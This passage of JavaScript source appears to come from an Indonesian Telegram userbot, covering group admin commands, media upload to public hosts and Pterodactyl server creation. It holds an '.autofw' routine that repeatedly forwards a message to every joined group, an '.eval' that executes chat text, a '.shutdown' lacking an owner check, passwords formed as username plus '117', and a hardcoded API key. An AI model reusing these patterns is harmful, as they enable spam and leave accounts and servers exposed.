                message: `<blockquote><b>ᴜsᴇʀ ᴛᴇʟᴀʜ ᴅɪᴘʀᴏᴍᴏᴛᴇ ᴍᴇɴᴊᴀᴅɪ ${rank}!</b></blockquote>`, 
                parseMode: "html", 
                replyTo: msg.id 
            });
            
        } catch (e) {
            await client.sendMessage(msg.chatId, { 
                message: `<blockquote><b>ɢᴀɢᴀʟ ᴘʀᴏᴍᴏᴛᴇ:</b>\n<code>${e.message}</code></blockquote>`, 
                parseMode: "html", 
                replyTo: msg.id 
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}demote`) && msg.isGroup) {
    (async () => {
        try {
            const args = msg.text.split(' ').slice(1);
            let targetUserId;
            
            if (msg.replyTo) {
                const replyMsg = await msg.getReplyMessage();
                targetUserId = replyMsg.senderId;
            } 
            else if (args.length > 0) {
                targetUserId = await getUserIdFromInput(client, msg.chatId, args[0]);
            } 
            else {
                await client.sendMessage(msg.chatId, { 
                    message: `<blockquote>[username/user_id/reply]</blockquote>`, 
                    parseMode: "html", 
                    replyTo: msg.id 
                });
                return;
            }
            
            await client.invoke(new Api.channels.EditAdmin({
                channel: msg.chatId,
                userId: targetUserId,
                adminRights: new Api.ChatAdminRights({}),
                rank: ""
            }));
            
            await client.sendMessage(msg.chatId, { 
                message: "<blockquote><b>ᴜsᴇʀ ᴛᴇʟᴀʜ ᴅɪᴅᴇᴍᴏᴛᴇ</b></blockquote>", 
                parseMode: "html", 
                replyTo: msg.id 
            });
            
        } catch (e) {
            await client.sendMessage(msg.chatId, { 
                message: `<blockquote><b>ɢᴀɢᴀʟ ᴅᴇᴍᴏᴛᴇ:</b>\n<code>${e.message}</code></blockquote>`, 
                parseMode: "html", 
                replyTo: msg.id 
            });
        }
    })();
    return;
}

            // .linkgroup
            if (msg.text?.startsWith(`${prefix}linkgroup`) && msg.isGroup) {
                try {
                    const invite = await client.invoke(new Api.messages.ExportChatInvite({ peer: msg.chatId }));
                    await client.sendMessage(msg.chatId, { message: `<blockquote>🔗 Link: ${invite.link}</blockquote>`, parseMode: "html", replyTo: msg.id });
                } catch (e) {
                    await client.sendMessage(msg.chatId, { message: `<blockquote>❌ ɢᴀɢᴀʟ: ${e.message}</blockquote>`, parseMode: "html", replyTo: msg.id });
                }
                return;
            }

            // .setname
            if (msg.text?.startsWith(`${prefix}setname`) && msg.isGroup) {
                const name = text.split(" ").slice(1).join(" ");
                if (!name) return;
                try {
                    await client.invoke(new Api.channels.EditTitle({ channel: msg.chatId, title: name }));
                    await client.sendMessage(msg.chatId, { message: `<blockquote>✅ ɴᴀᴍᴀ ɢʀᴜᴘ ʙᴇʀʜᴀsɪʟ ᴅɪ ɢᴀɴᴛɪ ᴋᴇ: ${name}</blockquote>`, parseMode: "html", replyTo: msg.id });
                } catch (e) {
                    await client.sendMessage(msg.chatId, { message: `<blockquote>❌ ɢᴀɢᴀʟ: ${e.message}</blockquote>`, parseMode: "html", replyTo: msg.id });
                }
                return;
            }

            // .setdesc
            if (msg.text?.startsWith(`${prefix}setdesc`) && msg.isGroup) {
                const desc = text.split(" ").slice(1).join(" ");
                if (!desc) return;
                try {
                    await client.invoke(new Api.messages.EditChatAbout({ peer: msg.chatId, about: desc }));
                    await client.sendMessage(msg.chatId, { message: "<blockquote>✅ ᴅᴇsᴋʀɪᴘsɪ ɢʀᴜᴘ ʙᴇʀʜᴀsɪʟ ᴅɪ ɢᴀɴᴛɪ</blockquote>", parseMode: "html", replyTo: msg.id });
                } catch (e) {
                    await client.sendMessage(msg.chatId, { message: `<blockquote>❌ ɢᴀɢᴀʟ: ${e.message}</blockquote>`, parseMode: "html", replyTo: msg.id });
                }
                return;
            }

            // .revoke
            if (msg.text?.startsWith(`${prefix}revoke`) && msg.isGroup) {
                try {
                    await client.invoke(new Api.messages.ExportChatInvite({ peer: msg.chatId, legacyRevokePermanent: true }));
                    await client.sendMessage(msg.chatId, { message: "<blockquote>✅ ʟɪɴᴋ ɢʀᴜᴘ ʙᴇʀʜᴀsɪʟ ᴅɪ ʀᴇsᴇᴛ</blockquote>", parseMode: "html", replyTo: msg.id });
                } catch (e) {
                    await client.sendMessage(msg.chatId, { message: `<blockquote>❌ ɢᴀɢᴀʟ ʀᴇᴠᴏᴋᴇ: ${e.message}</blockquote>`, parseMode: "html", replyTo: msg.id });
                }
                return;
            }
           
            // === ADMIN/OWNER COMMANDS ===

            // .setpp
            if (msg.text?.startsWith(`${prefix}setpp`) && isOwner && msg.replyTo) {
                try {
                    const replyMsg = await msg.getReplyMessage();
                    const media = await client.downloadMedia(replyMsg.media);
                    const uploaded = await client.uploadFile({ file: media, workers: 1 });
                    await client.invoke(new Api.photos.UploadProfilePhoto({ file: uploaded }));
                    await client.sendMessage(msg.chatId, { message: "<blockquote>✅ Foto profil diganti!</blockquote>", parseMode: "html", replyTo: msg.id });
                } catch (e) {
                    await client.sendMessage(msg.chatId, { message: `<blockquote>❌ Gagal: ${e.message}</blockquote>`, parseMode: "html", replyTo: msg.id });
                }
                return;
            }

            // .shutdown
            if (msg.text?.startsWith(`${prefix}shutdown`)) {
                await client.sendMessage(msg.chatId, { message: "<blockquote>🔌 Bot dimatikan...</blockquote>", parseMode: "html", replyTo: msg.id });
                process.exit(1);
            }

            // .tourl
      if (msg.text?.startsWith(`${prefix}tourl`)) {
  (async () => {
    const axios = require('axios');
    const FormData = require('form-data');
    const fs = require('fs');
    const path = require('path');
    const os = require('os');
    const { v4: uuidv4 } = require('uuid');
    
    try {
      const chatId = msg.chatId;
      
      if (!msg.replyTo) {
        await client.sendMessage(chatId, {
          message: "<blockquote>❌ Balas (reply) ke media (foto/video/file)</blockquote>",
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      const repliedMsg = await msg.getReplyMessage();
      if (!repliedMsg) {
        await client.sendMessage(chatId, {
          message: "<blockquote>❌ Gagal mengambil pesan yang dibalas</blockquote>",
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      let fileId;
      let mediaType = "";
      let isImage = false;

      async function uploadToCatbox(buffer) {
        try {
          const form = new FormData();
          form.append('reqtype', 'fileupload');
          form.append('fileToUpload', buffer, { filename: 'file.bin' });
          const res = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: form.getHeaders(),
            timeout: 30000
          });
          const url = res.data.trim();
          if (url.startsWith('http')) {
            return url;
          }
          return null;
        } catch (e) {
          console.error("Catbox Error:", e.message);
          return null;
        }
      }

      async function uploadToSupa(buffer) {
        try {
          const form = new FormData();
          form.append('file', buffer, 'upload.jpg');
          const res = await axios.post('https://i.supa.codes/api/upload', form, {
            headers: form.getHeaders(),
            timeout: 30000
          });
          return res.data?.link || null;
        } catch (error) {
          console.error('Supa Upload Error:', error?.response?.data || error.message);
          return null;
        }
      }

      async function uploadToTmpFiles(buffer, ext, mime) {
        try {
          const form = new FormData();
          form.append('file', buffer, {
            filename: `${Date.now()}.${ext}`,
            contentType: mime
          });
          const res = await axios.post('https://tmpfiles.org/api/v1/upload', form, {
            headers: form.getHeaders(),
            timeout: 30000
          });
          return res.data?.data?.url?.replace('s.org/', 's.org/dl/') || null;
        } catch (error) {
          console.error('TmpFiles Error:', error.message);
          return null;
        }
      }

      async function uploadToUguu(filePath) {
        try {
          const form = new FormData();
          form.append('files[]', fs.createReadStream(filePath));
          const res = await axios.post('https://uguu.se/upload.php', form, {
            headers: form.getHeaders(),
            timeout: 30000
          });
          return res.data.files?.[0]?.url || null;
        } catch (error) {
          console.error('Uguu Upload Error:', error.message);
          return null;
        }
      }

      async function uploadToFreeImageHost(buffer) {
        try {
          let isImageBuffer = false;
          
          const firstBytes = buffer.slice(0, 12);
          const hex = firstBytes.toString('hex').toLowerCase();
          
          if (
            hex.startsWith('ffd8ff') ||
            hex.startsWith('89504e47') || 
            hex.startsWith('47494638') ||
            hex.startsWith('52494646') ||
            hex.startsWith('424d') ||
            hex.startsWith('49492a00') ||
            hex.startsWith('4d4d002a')
          ) {
            isImageBuffer = true;
          }
          
          if (!isImageBuffer) {
            return null;
          }

          const form = new FormData();
          form.append('source', buffer, 'file.png');
          const res = await axios.post('https://freeimage.host/api/1/upload', form, {
            params: { key: '6d207e02198a847aa98d0a2a901485a5' },
            headers: form.getHeaders(),
            timeout: 30000
          });
          return res.data?.image?.url || null;
        } catch (error) {
          console.error('FreeImage.Host Error:', error?.response?.data || error.message);
          return null;
        }
      }

      function detectFileType(buffer) {
        const firstBytes = buffer.slice(0, 12);
        const hex = firstBytes.toString('hex').toLowerCase();
        
        if (hex.startsWith('ffd8ff')) {
          return { ext: 'jpg', mime: 'image/jpeg' };
        } else if (hex.startsWith('89504e47')) {
          return { ext: 'png', mime: 'image/png' };
        } else if (hex.startsWith('47494638')) {
          return { ext: 'gif', mime: 'image/gif' };
        } else if (hex.startsWith('52494646') && buffer.slice(8, 12).toString() === 'WEBP') {
          return { ext: 'webp', mime: 'image/webp' };
        } else if (hex.startsWith('424d')) {
          return { ext: 'bmp', mime: 'image/bmp' };
        } else if (hex.startsWith('49492a00') || hex.startsWith('4d4d002a')) {
          return { ext: 'tiff', mime: 'image/tiff' };
        } else if (hex.startsWith('1f8b08')) {
          return { ext: 'gz', mime: 'application/gzip' };
        } else if (hex.startsWith('504b0304') || hex.startsWith('504b0506') || hex.startsWith('504b0708')) {
          return { ext: 'zip', mime: 'application/zip' };
        } else if (hex.startsWith('25504446')) {
          return { ext: 'pdf', mime: 'application/pdf' };
        } else if (hex.startsWith('00000018')) {
          return { ext: 'mp4', mime: 'video/mp4' };
        } else if (hex.startsWith('00000020')) {
          return { ext: 'mp4', mime: 'video/mp4' };
        } else if (hex.startsWith('3026b2758e66cf11a6d900aa0062ce6c')) {
          return { ext: 'wmv', mime: 'video/x-ms-wmv' };
        }
        
        return { ext: 'bin', mime: 'application/octet-stream' };
      }

      if (repliedMsg.photo) {
        const photos = repliedMsg.photo || repliedMsg.media?.photo;
        if (photos) {
          const largestPhoto = Array.isArray(photos) ? photos[photos.length - 1] : photos;
          fileId = largestPhoto.id;
          mediaType = "Foto";
          isImage = true;
        }
      } else if (repliedMsg.video) {
        fileId = repliedMsg.video?.id || repliedMsg.media?.video?.id;
        mediaType = "Video";
      } else if (repliedMsg.document) {
        fileId = repliedMsg.document?.id || repliedMsg.media?.document?.id;
        mediaType = "Dokumen";
        if (repliedMsg.document?.mimeType?.startsWith('image/')) {
          isImage = true;
        }
      } else if (repliedMsg.audio) {
        fileId = repliedMsg.audio?.id || repliedMsg.media?.audio?.id;
        mediaType = "Audio";
      } else if (repliedMsg.sticker) {
        fileId = repliedMsg.sticker?.id || repliedMsg.media?.sticker?.id;
        mediaType = "Stiker";
        if (repliedMsg.sticker && !repliedMsg.sticker.animated) {
          isImage = true;
        }
      } else if (repliedMsg.animation) {
        fileId = repliedMsg.animation?.id || repliedMsg.media?.animation?.id;
        mediaType = "GIF";
      }

      if (!fileId) {
        await client.sendMessage(chatId, {
          message: "<blockquote>❌ Media tidak didukung atau tidak ditemukan.</blockquote>",
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      const loadingMsg = await client.sendMessage(chatId, {
        message: `<blockquote>⏳ Mengunduh ${mediaType}...</blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });

      let tmpFile;
      try {
        const buffer = await client.downloadMedia(repliedMsg.media || repliedMsg);
        if (!buffer || buffer.length === 0) {
          throw new Error("Gagal mendownload media");
        }

        const fileType = detectFileType(buffer);
        const ext = fileType.ext;
        const mime = fileType.mime;

        if (mime.startsWith('image/')) {
          isImage = true;
        }

        tmpFile = path.join(os.tmpdir(), `${uuidv4()}.${ext}`);
        fs.writeFileSync(tmpFile, buffer);

        const fileSizeInBytes = buffer.length;
        const fileSizeInMB = (fileSizeInBytes / (1024 * 1024)).toFixed(2);
        const size = `${fileSizeInMB} MB`;

        await client.editMessage(chatId, {
          message: loadingMsg.id,
          text: `<blockquote>⏳ Mengunggah ${mediaType} (${size}) ke multi-host...</blockquote>`,
          parseMode: "html"
        });

        const uploadPromises = [
          uploadToCatbox(buffer),
          uploadToSupa(buffer),
          uploadToTmpFiles(buffer, ext, mime),
          uploadToUguu(tmpFile),
        ];

        if (isImage) {
          uploadPromises.push(uploadToFreeImageHost(buffer));
        }

        const results = await Promise.all(uploadPromises);

        const catboxLink = results[0];
        const supaLink = results[1];
        const tmpLink = results[2];
        const uguuLink = results[3];
        const freeImageHostLink = isImage ? results[4] : null;

        let msgText = `<blockquote><b>Upload Selesai (${size})</b>\n`;
        let hasLink = false;

        if (catboxLink) {
          msgText += `\n🔗 <b>Catbox:</b> ${catboxLink}`;
          hasLink = true;
        }
        if (supaLink) {
          msgText += `\n🔗 <b>Supa:</b> ${supaLink}`;
          hasLink = true;
        }
        if (tmpLink) {
          msgText += `\n🔗 <b>TmpFiles:</b> ${tmpLink}`;
          hasLink = true;
        }
        if (uguuLink) {
          msgText += `\n🔗 <b>Uguu:</b> ${uguuLink}`;
          hasLink = true;
        }
        if (freeImageHostLink) {
          msgText += `\n🔗 <b>FreeImage:</b> ${freeImageHostLink}`;
          hasLink = true;
        }

        msgText += `\n\n✅️ <i>Media berhasil diupload ke ${hasLink ? 'beberapa host' : 'tidak ada host'}</i></blockquote>`;

        if (!hasLink) {
          msgText = "<blockquote>❌ Maaf, semua layanan upload gagal.</blockquote>";
        }

        await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true }).catch(() => {});

        await client.sendMessage(chatId, {
          message: msgText,
          parseMode: "html",
          replyTo: msg.id
        });

      } catch (error) {
        console.error("tourl Error:", error);
        await client.editMessage(chatId, {
          message: loadingMsg.id,
          text: `<blockquote>❌ Gagal memproses media.\n\nError: ${error.message}</blockquote>`,
          parseMode: "html"
        });
        
        setTimeout(async () => {
          try {
            await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true });
          } catch {}
        }, 5000);
      } finally {
        if (tmpFile && fs.existsSync(tmpFile)) {
          try {
            fs.unlinkSync(tmpFile);
          } catch (unlinkErr) {
            console.warn("Gagal hapus file sementara:", unlinkErr.message);
          }
        }
      }

    } catch (error) {
      console.error("Error in .tourl command:", error);
      await client.sendMessage(msg.chatId, {
        message: `<blockquote>❌ Terjadi kesalahan: ${error.message}</blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });
    }
  })();
  return;
}

            // .eval - DANGEROUS
            if (msg.text?.startsWith(`${prefix}eval`) && isOwner) {
                const code = text.split(" ").slice(1).join(" ");
                if (!code) {
                    await client.sendMessage(msg.chatId, { message: "<blockquote>⚠️ Format: .eval <kode></blockquote>", parseMode: "html", replyTo: msg.id });
                    return;
                }
                try {
                    const util = require('util');
                    let result = eval(code);
                    if (result instanceof Promise) result = await result;
                    const output = util.inspect(result, { depth: 2 }).substring(0, 3000);
                    await client.sendMessage(msg.chatId, { message: `<blockquote>✅ <b>Output:</b>\n<code>${escapeHtml(output)}</code></blockquote>`, parseMode: "html", replyTo: msg.id });
                } catch (e) {
                    await client.sendMessage(msg.chatId, { message: `<blockquote>❌ <b>Error:</b>\n<code>${escapeHtml(e.message)}</code></blockquote>`, parseMode: "html", replyTo: msg.id });
                }
                return;
            }

            // .setbio
            if (msg.text?.startsWith(`${prefix}setbio`) && isOwner) {
                const bio = text.split(" ").slice(1).join(" ");
                if (!bio) {
                    await client.sendMessage(msg.chatId, { message: "<blockquote>⚠️ Format: .setbio <bio></blockquote>", parseMode: "html", replyTo: msg.id });
                    return;
                }
                try {
                    await client.invoke(new Api.account.UpdateProfile({ about: bio }));
                    await client.sendMessage(msg.chatId, { message: `<blockquote>✅ Bio diganti ke: ${bio}</blockquote>`, parseMode: "html", replyTo: msg.id });
                } catch (e) {
                    await client.sendMessage(msg.chatId, { message: `<blockquote>❌ Gagal: ${e.message}</blockquote>`, parseMode: "html", replyTo: msg.id });
                }
                return;
            }

            // .setnamebot
            if (msg.text?.startsWith(`${prefix}setnamebot`) && isOwner) {
                const name = text.split(" ").slice(1).join(" ");
                if (!name) {
                    await client.sendMessage(msg.chatId, { message: "<blockquote>⚠️ Format: .setnamebot <nama></blockquote>", parseMode: "html", replyTo: msg.id });
                    return;
                }
                try {
                    const parts = name.split(" ");
                    const firstName = parts[0];
                    const lastName = parts.slice(1).join(" ") || "";
                    await client.invoke(new Api.account.UpdateProfile({ firstName, lastName }));
                    await client.sendMessage(msg.chatId, { message: `<blockquote>✅ Nama diganti ke: ${name}</blockquote>`, parseMode: "html", replyTo: msg.id });
                } catch (e) {
                    await client.sendMessage(msg.chatId, { message: `<blockquote>❌ Gagal: ${e.message}</blockquote>`, parseMode: "html", replyTo: msg.id });
                }
                return;
            }

            // .restart
            if (msg.text?.startsWith(`${prefix}restart`) && isOwner) {
                await client.sendMessage(msg.chatId, { message: "<blockquote>🔄 Restarting...</blockquote>", parseMode: "html", replyTo: msg.id });
                process.exit(0);
            }

            // .yts - YouTube search
            if (msg.text?.startsWith(`${prefix}yts`)) {
                const query = text.split(" ").slice(1).join(" ");
                if (!query) {
                    await client.sendMessage(msg.chatId, { message: `<blockquote>⚠️ Format: ${prefix}yts <query></blockquote>`, parseMode: "html", replyTo: msg.id });
                    return;
                }
                try {
                    const loading = await client.sendMessage(msg.chatId, { message: `<blockquote>🔍 Mencari: ${query}...</blockquote>`, parseMode: "html", replyTo: msg.id });
                    const yts = require('yt-search');
                    const results = await yts(query);
                    if (!results.videos || results.videos.length === 0) {
                        await client.editMessage(msg.chatId, { message: loading.id, text: "<blockquote>❌ Tidak ditemukan</blockquote>", parseMode: "html" });
                        return;
                    }
                    const v = results.videos[0];
                    const caption = `<blockquote>🎬 <b>${v.title}</b>\n👤 ${v.author.name}\n⏱️ ${v.timestamp}\n👀 ${v.views.toLocaleString()} views\n🔗 ${v.url}</blockquote>`;
                    await client.deleteMessages(msg.chatId, [loading.id], { revoke: true });
                    await client.sendFile(msg.chatId, { file: v.image, caption, parseMode: "html", replyTo: msg.id });
                } catch (e) {
                    await client.sendMessage(msg.chatId, { message: `<blockquote>❌ Error: ${e.message}</blockquote>`, parseMode: "html", replyTo: msg.id });
                }
                return;
            }

            // .autofw - Auto forward
            if (msg.text?.startsWith(`${prefix}autofw`)) {
    const parts = msg.text.split(" ");
    const subCmd = parts[1]?.toLowerCase();
    const userId = msg.senderId.toString();
    
    const userBlacklist = getUserBlacklist(userId);
    
    const replyMsg = msg.replyMessage || 
                     msg.replyToMessage || 
                     (await msg.getReplyMessage?.());

    if (subCmd === "on") {
        if (!replyMsg) {
            await client.sendMessage(msg.chatId, { 
                message: `<blockquote>⚠️ ʀᴇᴘʟʏ ᴋᴇ ᴘᴇsᴀɴ ᴜɴᴛᴜᴋ ${prefix}autofw on [menit]</blockquote>`, 
                parseMode: "html", 
                replyTo: msg.id 
            });
            return;
        }
        
        const minutes = parseInt(parts[2]);
        if (isNaN(minutes) || minutes < 1) {
            await client.sendMessage(msg.chatId, { 
                message: `<blockquote>⚠️ ғᴏʀᴍᴀᴛ: ${prefix}autofw on [menit]\nᴄᴏɴᴛᴏʜ: ${prefix}autofw on 5</blockquote>`, 
                parseMode: "html", 
                replyTo: msg.id 
            });
            return;
        }
        
        if (!autoFwStates.has(userId)) {
            autoFwStates.set(userId, {});
        }
        
        const fwState = autoFwStates.get(userId);
        
        if (fwState.interval) {
            clearInterval(fwState.interval);
        }
        
        fwState.msgId = replyMsg.id;
        fwState.chatId = msg.chatId;
        fwState.message = replyMsg;
        fwState.round = 0;
        fwState.minutes = minutes;
        fwState.startTime = Date.now();
        fwState.userBlacklist = userBlacklist;
        
        const runForward = async () => {
            try {
                fwState.round++;
                let successCount = 0;
                let failCount = 0;
                
                const dialogs = await client.getDialogs();
                const groups = dialogs.filter(d => d.isGroup);
                
                const progressMsg = await client.sendMessage(msg.chatId, {
                    message: `<blockquote><b>ᴍᴇᴍᴜʟᴀɪ ᴀᴜᴛᴏ ғᴏʀᴡᴀʀᴅ ᴘᴜᴛᴀʀᴀɴ ${fwState.round}</b>\n\n➤ ᴘʀᴏsᴇs: 0/${groups.length} grup\n➤ ᴅᴇʟᴀʏ: ${minutes} menit</blockquote>`,
                    parseMode: "html"
                });
                
                for (let i = 0; i < groups.length; i++) {
                    const group = groups[i];
                    const groupIdStr = group.id.toString();
                    
                    if (fwState.userBlacklist.includes(groupIdStr)) {
                        failCount++;
                        continue;
                    }
                    
                    try {
                        await client.forwardMessages(group.id, { 
                            messages: fwState.msgId, 
                            fromPeer: fwState.chatId 
                        });
                        successCount++;
                        
                        if ((i + 1) % 10 === 0 || i === groups.length - 1) {
                            await client.editMessage(msg.chatId, {
                                message: progressMsg.id,
                                text: `<blockquote><b>ᴍᴇᴍᴜʟᴀɪ ᴀᴜᴛᴏ ғᴏʀᴡᴀʀᴅ ᴘᴜᴛᴀʀᴀɴ ${fwState.round}</b>\n\n➤ ᴘʀᴏsᴇs: ${i + 1}/${groups.length} grup\n➤ sᴜᴋsᴇs: ${successCount}\n❌ ɢᴀɢᴀʟ: ${failCount}</blockquote>`,
                                parseMode: "html"
                            });
                        }
                        
                        await sleep(1000);
                        
                    } catch (error) {
                        failCount++;
                        console.error(`Gagal forward ke grup ${group.id}:`, error.message);
                    }
                }
                
                await client.deleteMessages(msg.chatId, [progressMsg.id]);
                
                await client.sendMessage(msg.chatId, {
                    message: `<blockquote><b>ᴀᴜᴛᴏ ғᴏʀᴡᴀʀᴅ ᴘᴜᴛᴀʀᴀɴ ${fwState.round} sᴇʟᴇsᴀɪ</b>\n\n➤ <b>ʜᴀsɪʟ:</b>\n➤ ɢʀᴜᴘ ᴅɪᴛᴇᴍᴜᴋᴀɴ: ${groups.length}\n➤ ʙᴇʀʜᴀsɪʟ: ${successCount}\n➤ ɢᴀɢᴀʟ: ${failCount}\n\n➤ <b>ᴅᴇʟᴀʏ:</b> ${minutes} menit\n➤ <b>ᴘᴜᴛᴀʀᴀɴ sᴇʟᴀɴᴊᴜᴛɴʏᴀ:</b> ${formatDuration(minutes * 60 * 1000)} lagi</blockquote>`,
                    parseMode: "html"
                });
                
            } catch (error) {
                console.error("Error dalam runForward:", error);
                await client.sendMessage(msg.chatId, {
                    message: `<blockquote>❌ <b>ᴇʀʀᴏʀ ᴀᴜᴛᴏ ғᴏʀᴡᴀʀᴅ:</b>\n${error.message}</blockquote>`,
                    parseMode: "html"
                });
            }
        };
        
        fwState.interval = setInterval(runForward, minutes * 60 * 1000);
        
        await runForward();
        
        await client.sendMessage(msg.chatId, { 
            message: `<blockquote>✅ <b>ᴀᴜᴛᴏ ғᴏʀᴡᴀʀᴅ ᴀᴋᴛɪғ!</b>\n\n➤ <b>ᴅᴇʟᴀʏ:</b> ${minutes} menit (${minutes * 60} detik)\n➤ <b>ᴘᴇsᴀɴ:</b> ʀᴇᴘʟʏ ᴋᴇ ᴘᴇsᴀɴ ᴅᴇɴɢᴀɴ ɪᴅ ${replyMsg.id}\n➤ <b>sᴛᴀᴛᴜs:</b> ʙᴇʀᴊᴀʟᴀɴ sᴇᴛɪᴀᴘ ${minutes} menit\n➤ <b>ʙʟᴀᴄᴋʟɪsᴛ:</b> ${userBlacklist.length}</blockquote>`, 
            parseMode: "html", 
            replyTo: msg.id 
        });
        
    } else if (subCmd === "off") {
        const fwState = autoFwStates.get(userId);
        
        if (fwState?.interval) {
            clearInterval(fwState.interval);
            fwState.interval = null;
            
            const duration = fwState.startTime ? 
                formatDuration(Date.now() - fwState.startTime) : 
                "ᴛɪᴅᴀᴋ ᴅɪᴋᴇᴛᴀʜᴜɪ";
            
            await client.sendMessage(msg.chatId, { 
                message: `<blockquote><b>ᴀᴜᴛᴏ ғᴏʀᴡᴀʀᴅ ᴅɪɴᴏɴᴀᴋᴛɪғᴋᴀɴ!</b>\n\n➤ <b>sᴛᴀᴛɪsᴛɪᴄ:</b>\n➤ ᴘᴜᴛᴀʀᴀɴ: ${fwState.round}\n➤ ᴅᴇʟᴀʏ: ${fwState.minutes} menit\n➤ ᴅᴜʀᴀsɪ: ${duration}</blockquote>`, 
                parseMode: "html", 
                replyTo: msg.id 
            });
            
            autoFwStates.delete(userId);
        } else {
            await client.sendMessage(msg.chatId, { 
                message: "<blockquote>⚠️ <b>ᴀᴜᴛᴏ ғᴏʀᴡᴀʀᴅ ᴛɪᴅᴀᴋ ᴀᴋᴛɪғ ᴜɴᴛᴜᴋ ᴀɴᴅᴀ</b></blockquote>", 
                parseMode: "html", 
                replyTo: msg.id 
            });
        }
    } else if (subCmd === "status") {
        const fwState = autoFwStates.get(userId);
        
        if (fwState?.interval) {
            const duration = fwState.startTime ? 
                formatDuration(Date.now() - fwState.startTime) : 
                "ᴛɪᴅᴀᴋ ᴅɪᴋᴇᴛᴀʜᴜɪ";
            
            await client.sendMessage(msg.chatId, { 
                message: `<blockquote><b>sᴛᴀᴛᴜs ᴀᴜᴛᴏ ғᴏʀᴡᴀʀᴅ</b>\n\n<b>• sᴛᴀᴛᴜs:</b> ᴀᴋᴛɪғ\n➤ <b>ᴘᴜᴛᴀʀᴀɴ:</b> ${fwState.round}\n➤ <b>ᴅᴇʟᴀʏ:</b> ${fwState.minutes} menit\n➤ <b>ᴅᴜʀᴀsɪ:</b> ${duration}\n➤ <b>ᴘᴇsᴀɴ ɪᴅ:</b> ${fwState.msgId}\n➤ <b>ʙʟᴀᴄᴋʟɪsᴛ:</b> ${userBlacklist.length}</blockquote>`, 
                parseMode: "html", 
                replyTo: msg.id 
            });
        } else {
            await client.sendMessage(msg.chatId, { 
                message: `<blockquote><b>sᴛᴀᴛᴜs ᴀᴜᴛᴏ ғᴏʀᴡᴀʀᴅ</b>\n\n<b>• sᴛᴀᴛᴜs:</b> ᴛɪᴅᴀᴋ ᴀᴋᴛɪғ\n➤ <b>ʙʟᴀᴄᴋʟɪsᴛ:</b> ${userBlacklist.length} grup\n\nɢᴜɴᴀᴋᴀɴ: <code>${prefix}autofw on [menit]</code> ᴜɴᴛᴜᴋ ᴀᴜᴛᴏғᴡ</blockquote>`, 
                parseMode: "html", 
                replyTo: msg.id 
            });
        }
    } else {
        await client.sendMessage(msg.chatId, { 
            message: `<blockquote><b>ᴘᴇʀɪɴᴛᴀʜ ᴀᴜᴛᴏ ғᴏʀᴡᴀʀᴅ</b>\n\n<b>ғᴏʀᴍᴀᴛ:</b>\n• <code>${prefix}autofw on [menit]</code> - ᴀᴋᴛɪғᴋᴀɴ (reply pesan)\n• <code>${prefix}autofw off</code> - ɴᴏɴᴀᴋᴛɪғᴋᴀɴ\n• <code>${prefix}autofw status</code> - ᴄᴇᴋ sᴛᴀᴛᴜs\n\n<b>ʙʟᴀᴄᴋʟɪsᴛ:</b> ${userBlacklist.length} grup diblacklist</blockquote>`, 
            parseMode: "html", 
            replyTo: msg.id 
        });
    }
    return;
}

            // === PTERODACTYL COMMANDS ===
            const pteroConfig = (() => {
                try { return require('../../config/pterodactyl'); } catch { return null; }
            })();

            const sizeMap = {
                "1gb": { mem: 1024, disk: 1024, cpu: 10 },
                "2gb": { mem: 2048, disk: 2048, cpu: 20 },
                "3gb": { mem: 3072, disk: 3072, cpu: 30 },
                "4gb": { mem: 4096, disk: 4096, cpu: 40 },
                "5gb": { mem: 5120, disk: 5120, cpu: 50 },
                "6gb": { mem: 6144, disk: 6144, cpu: 60 },
                "7gb": { mem: 7168, disk: 7168, cpu: 70 },
                "8gb": { mem: 8192, disk: 8192, cpu: 80 },
                "9gb": { mem: 9216, disk: 9216, cpu: 90 },
                "10gb": { mem: 10240, disk: 10240, cpu: 100 },
                "unli": { mem: 0, disk: 0, cpu: 0 }
            };

            // .1gb to .10gb, .unli
            for (const [sizeKey, spec] of Object.entries(sizeMap)) {
                if (msg.text?.startsWith(`${prefix}${sizeKey}`)) {
                    if (!pteroConfig) {
                        await client.sendMessage(msg.chatId, { message: "<blockquote>❌ Config pterodactyl belum diatur!</blockquote>", parseMode: "html", replyTo: msg.id });
                        return;
                    }
                    const args = text.split(" ").slice(1).join(" ").split(",").map(p => p.trim());
                    if (args.length < 1 || !args[0]) {
                        await client.sendMessage(msg.chatId, { message: `<blockquote>⚠️ Format: .${sizeKey} nama,target</blockquote>`, parseMode: "html", replyTo: msg.id });
                        return;
                    }
                    const name = args[0];
                    const username = name.replace(/^@/, "").trim();
                    const password = `${username}117`;
                    const email = `${username}@suika.com`;
                    const loading = await client.sendMessage(msg.chatId, { message: `<blockquote>🚀 Membuat server ${name}...</blockquote>`, parseMode: "html", replyTo: msg.id });
                    try {
                        const { domain, adminApiKey, defaultEggs, defaultLocation } = pteroConfig;
                        // Create user
                        let userId;
                        const checkRes = await axios.get(`${domain}/api/application/users?filter[email]=${encodeURIComponent(email)}`, { headers: { Authorization: `Bearer ${adminApiKey}`, Accept: "application/json" } });
                        if (checkRes.data.data?.length > 0) {
                            userId = checkRes.data.data[0].attributes.id;
                        } else {
                            const createRes = await axios.post(`${domain}/api/application/users`, { email, username, first_name: username, last_name: username, language: "en", password, root_admin: false }, { headers: { Authorization: `Bearer ${adminApiKey}`, "Content-Type": "application/json", Accept: "application/json" } });
                            userId = createRes.data.attributes.id;
                        }
                        // Create server
                        const serverRes = await axios.post(`${domain}/api/application/servers`, {
                            name, user: userId, egg: defaultEggs, docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
                            startup: "if [ -f /home/container/package.json ]; then npm install; fi; npm start",
                            environment: { INST: "npm", USER_UPLOAD: "0", AUTO_UPDATE: "0", CMD_RUN: "npm start" },
                            limits: { memory: spec.mem, swap: 0, disk: spec.disk, io: 500, cpu: spec.cpu },
                            feature_limits: { databases: 5, backups: 5, allocations: 1 },
                            deploy: { locations: [defaultLocation], dedicated_ip: false, port_range: [] }
                        }, { headers: { Authorization: `Bearer ${adminApiKey}`, "Content-Type": "application/json", Accept: "application/json" } });
                        const srv = serverRes.data.attributes;
